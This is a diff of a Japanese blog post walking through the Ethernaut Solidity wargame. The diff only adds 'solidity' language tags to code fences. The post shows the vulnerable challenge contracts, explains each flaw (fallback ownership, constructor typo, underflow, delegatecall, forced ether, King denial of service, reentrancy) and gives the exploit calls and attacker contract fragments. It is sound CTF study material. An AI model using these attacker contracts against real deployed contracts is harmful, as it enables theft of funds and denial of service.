@@ -15,7 +15,7 @@ date: "2018-01-05T00:27:39+09:00"
 順に呼び出していくだけ。コントラクトのメソッドはPromiseを返すので、awaitを使う
 と楽に書ける。以降の解答ではawaitを省略する。
 
-```
+```solidity
 await contract.info()
 await contract.info1()
 await contract.info2("hello")
@@ -31,7 +31,7 @@ await contract.authenticate("ethernaut0")
 
 対象のコントラクトは下記の通り:
 
-```
+```solidity
 contract Fallback is Ownable {
 
   mapping(address => uint) public contributions;
@@ -58,7 +58,7 @@ Fallbackメソッドで `msg.sender` の中身をチェックせずに、 `owner
 ッドを呼び出す前に、`.contribute()` を 呼び出して `contributions` を増やしてお
 く。
 
-```
+```solidity
 contract.contribute({value: 1})
 contract.send(1)
 contract.withdraw()
@@ -66,7 +66,7 @@ contract.withdraw()
 
 ## 2. Fallout
 
-```
+```solidity
 contract Fallout is Ownable {
 
   mapping (address => uint) allocations;
@@ -84,7 +84,7 @@ contract Fallout is Ownable {
 コントラクトのコンストラクタ名にタイポがあり、ただのメソッドになってしまってい
 る。
 
-```
+```solidity
 await contract.Fal1out()
 ```
 
@@ -93,7 +93,7 @@ await contract.Fal1out()
 
 ## 3. Token
 
-```
+```solidity
 contract Token {
   mapping(address => uint) balances;
   uint public totalSupply;
@@ -113,13 +113,13 @@ contract Token {
 初期状態で `balances[player]` に20 weiチャージされていたので、21 weiをtransfer
 すればアンダーフローが発生する。
 
-```
+```solidity
 await contract.transfer(player, 21)
 ```
 
 ## 4. Delegation
 
-```
+```solidity
 contract Delegate {
 
   address public owner;
@@ -158,14 +158,14 @@ Delegatecallというのは、別コントラクトのメソッドを、呼び�
 この場合においては、 `Delegate.pwn()` をdelegatecallすれば、 `Delegation` コン
 トラクトを `owner` を上書きできる。
 
-```
+```solidity
 await contract.sendTransaction({data: web3.sha3("pwn()").substring(0, 10)})
 ```
 
 ## 5. Force
 
 
-```
+```solidity
 contract Force {/*
 
                    MEOW ?
@@ -183,7 +183,7 @@ contract Force {/*
 この問題以降は、自分で攻撃用のコントラクトを書 いてデプロイする
 必要がある。自分の場合は、 [Remix](https://remix.ethereum.org/) を使った。
 
-```
+```solidity
 contract Attacker {
     function Attacker() public payable {
         address victim = 0x1384Dee841458867C7DD45e2263CD485E5c96567;
@@ -196,7 +196,7 @@ contract Attacker {
 
 ## 6. King
 
-```
+```solidity
 contract King is Ownable {
 
   address public king;
@@ -220,7 +220,7 @@ contract King is Ownable {
 Payableなメソッドが存在しないコントラクトから一回送金すれば、以降は
 `king.transfer(msg.value);` で常に例外が発生して、 `king` が更新不可能になる。
 
-```
+```solidity
 contract Attacker {
     function Attacker() public payable {
         address victim = 0x3C4d1E25Cc0B115E3a9b1c0D04bEFbE94406C83E;
@@ -239,7 +239,7 @@ gasを付与するようにした。
 
 ## 7. Re-entrance
 
-```
+```solidity
 contract Reentrance {
 
   mapping(address => uint) public balances;
@@ -267,7 +267,7 @@ contract Reentrance {
 `withdraw()` を呼べば、相互再帰が発生して、`Reentrance` コントラクトの残高か
 gasが尽きるまで `withdraw()` が繰り返し実行される。
 
-```
+```solidity
 contract Attacker {
     address constant victim = 0x0f4108dae2ab39f5c6fc7855dbbe8f8a988be112;
 
@@ -288,7 +288,7 @@ contract Attacker {
 
 ## 8. Elevator
 
-```
+```solidity
 interface Building {
   function isLastFloor(uint) view public returns (bool);
 }
@@ -312,7 +312,7 @@ contract Elevator {
 `Building.isLastFloor()` の1回目の呼び出しではfalseを返し、2回目の呼び出しでは
 trueを返せば `top` をtrueにできる。
 
-```
+```solidity
 contract Elevator {
     function goTo(uint) public;
 }
